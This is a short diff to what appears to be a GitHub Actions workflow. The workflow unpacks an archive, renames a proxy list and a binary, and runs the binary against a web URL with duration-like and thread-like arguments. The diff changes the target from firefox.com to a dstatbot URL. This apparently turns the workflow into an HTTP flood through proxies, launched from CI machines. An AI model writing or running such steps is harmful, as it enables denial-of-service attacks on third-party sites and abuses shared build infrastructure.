@@ -34,11 +34,11 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x *
-          mv tol o          
+          mv ki o          
           
            
           
-          ./o https://www.firefox.com/en-US/ 320 1 1 90.txt
+          ./o https://c4.dstatbot.win/T2w0uCJb 720 1 1 
           
 
           
